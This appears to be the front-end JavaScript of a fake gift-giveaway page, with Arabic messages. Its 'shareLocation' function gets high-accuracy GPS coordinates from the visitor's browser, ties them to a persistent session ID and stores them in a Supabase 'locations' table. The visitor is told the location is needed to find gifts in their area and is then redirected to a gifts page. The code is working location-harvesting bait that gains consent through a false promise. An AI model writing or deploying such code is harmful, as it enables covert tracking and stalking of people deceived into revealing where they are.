const supabaseClient = window.supabaseClient;

function showToast(message, type) {
  var container = document.getElementById('toastContainer');
  var toast = document.createElement('div');
  toast.className = 'toast toast--' + type;
  toast.textContent = message;
  container.appendChild(toast);
  setTimeout(function () {
    toast.classList.add('removing');
    setTimeout(function () { toast.remove(); }, 300);
  }, 4000);
}

function showLoader() {
  document.getElementById('loader').classList.add('active');
}

function hideLoader() {
  document.getElementById('loader').classList.remove('active');
}

function getOrCreateSessionId() {
  var key = 'ls_session_id';
  var id = localStorage.getItem(key);
  if (!id) {
    id = crypto.randomUUID ? crypto.randomUUID() : Date.now().toString(36) + Math.random().toString(36).slice(2);
    localStorage.setItem(key, id);
  }
  return id;
}

async function shareLocation() {
  var btn = document.getElementById('shareBtn');
  btn.disabled = true;

  if (!navigator.geolocation) {
    showToast('عذراً، متصفحك لا يدعم تحديد الموقع للحصول على الهدايا.', 'error');
    btn.disabled = false;
    return;
  }

  showLoader();

  navigator.geolocation.getCurrentPosition(
    async function (position) {
      var lat = position.coords.latitude;
      var lng = position.coords.longitude;
      var acc = position.coords.accuracy;
      var sessionId = getOrCreateSessionId();

      try {
        var { error } = await supabaseClient
          .from('locations')
          .insert({ latitude: lat, longitude: lng, accuracy: acc, session_id: sessionId });

        if (error) throw error;

        hideLoader();
        showToast('تم استقبال طلبك، احصل على الهدايا الآن!', 'success');
        
        setTimeout(function () {
          window.location.href = 'gifts.html';
        }, 1500);
      } catch (err) {
        console.error("Supabase Error:", err);
        hideLoader();
        showToast('فشل الاتصال: ' + (err.message || err.details || 'خطأ في قاعدة البيانات'), 'error');
        btn.disabled = false;
        btn.textContent = 'إعادة المحاولة للحصول على الهدايا';
        btn.onclick = shareLocation;
      }
    },
    function (err) {
      hideLoader();
      btn.disabled = false;
      var msgs = {
        1: 'يجب السماح بالوصول للموقع لتحديد الهدايا المتوفرة في منطقتك.',
        2: 'الموقع غير متاح حالياً. تأكد من تشغيل الـ GPS.',
        3: 'انتهت مهلة الحصول على الموقع.'
      };
      showToast(msgs[err.code] || 'حدث خطأ غير متوقع.', 'error');
    },
    { enableHighAccuracy: true, timeout: 15000, maximumAge: 0 }
  );
}

function showPermissionHint() {
  var modal = document.getElementById('permissionModal');
  modal.classList.add('active');

  document.getElementById('confirmPermBtn').onclick = function () {
    modal.classList.remove('active');
    shareLocation();
  };
}

window.shareLocation = shareLocation;
window.showPermissionHint = showPermissionHint;
